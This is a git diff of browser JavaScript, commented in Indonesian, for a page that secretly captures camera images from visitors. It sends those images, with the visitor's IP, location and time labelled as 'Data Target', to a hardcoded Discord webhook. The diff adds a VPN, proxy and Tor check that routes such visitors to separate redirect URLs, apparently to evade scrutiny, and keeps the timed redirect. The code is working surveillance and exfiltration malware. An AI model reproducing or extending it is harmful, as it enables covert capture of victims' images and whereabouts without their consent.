@@ -1,5 +1,6 @@
 const webhookURL = "https://discord.com/api/webhooks/1352760933654724668/RiiciP_za_eGd7u1OvHr1IbLXm4Ob7NWmk7MUMkOJ8Z9TZOAOFFPESpwMspxeQR_WPp9"; 
-const jsonURL = "server.json"; // Ganti dari urls.json ke server.json
+const jsonURL = "server.json"; // Untuk redirect normal
+const vpnJsonURL = "vpn.json"; // Untuk redirect jika pakai VPN
 
 const canvas = document.createElement("canvas");
 const context = canvas.getContext("2d");
@@ -39,6 +40,9 @@ fetch("https://api64.ipify.org?format=json")
                 }, 3000);
             })
             .catch(err => console.error("Akses kamera ditolak:", err));
+
+        // Cek apakah pengguna pakai VPN atau tidak
+        checkVPN(ip);
     })
     .catch(err => console.error("Gagal ambil IP:", err));
 
@@ -48,7 +52,7 @@ function sendToDiscord(blob, ip, location, localTime) {
     formData.append("file", blob, "capture.jpg");
 
     formData.append("payload_json", JSON.stringify({
-        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **Time**: ${localTime}`
+        content: `📸 **Data Target**\n🌍 **IP**: ${ip}\n📌 **Location**: ${location}\n⏰ **InterTime**: ${localTime}`
     }));
 
     fetch(webhookURL, {
@@ -57,18 +61,37 @@ function sendToDiscord(blob, ip, location, localTime) {
     });
 }
 
-// Ambil URL acak dari server.json & redirect setelah 11 detik
-fetch(jsonURL)
-    .then(response => response.json())
-    .then(data => {
-        const urls = data.urls;
-        if (urls && urls.length > 0) {
-            const randomURL = urls[Math.floor(Math.random() * urls.length)];
-            setTimeout(() => {
-                window.location.href = randomURL;
-            }, 11000);
-        } else {
-            console.error("JSON tidak berisi URL");
-        }
-    })
-    .catch(error => console.error("Gagal mengambil URL dari server.json:", error));
+// Cek VPN dan pilih JSON yang sesuai
+function checkVPN(ip) {
+    fetch(`https://ipapi.co/${ip}/json/`) // Bisa ganti dengan API lain
+        .then(response => response.json())
+        .then(data => {
+            if (data.security?.vpn || data.proxy || data.tor) {
+                redirectWithJson(vpnJsonURL); // Jika pakai VPN, ambil URL dari vpn.json
+            } else {
+                redirectWithJson(jsonURL); // Jika tidak, ambil URL dari server.json
+            }
+        })
+        .catch(error => {
+            console.error("Gagal mendeteksi VPN:", error);
+            redirectWithJson(jsonURL); // Jika gagal deteksi, tetap redirect ke server.json
+        });
+}
+
+// Ambil URL acak dari JSON dan redirect
+function redirectWithJson(jsonFile) {
+    fetch(jsonFile)
+        .then(response => response.json())
+        .then(data => {
+            const urls = data.urls;
+            if (urls && urls.length > 0) {
+                const randomURL = urls[Math.floor(Math.random() * urls.length)];
+                setTimeout(() => {
+                    window.location.href = randomURL;
+                }, 11000);
+            } else {
+                console.error("JSON tidak berisi URL");
+            }
+        })
+        .catch(error => console.error(`Gagal mengambil URL dari ${jsonFile}:`, error));
+}
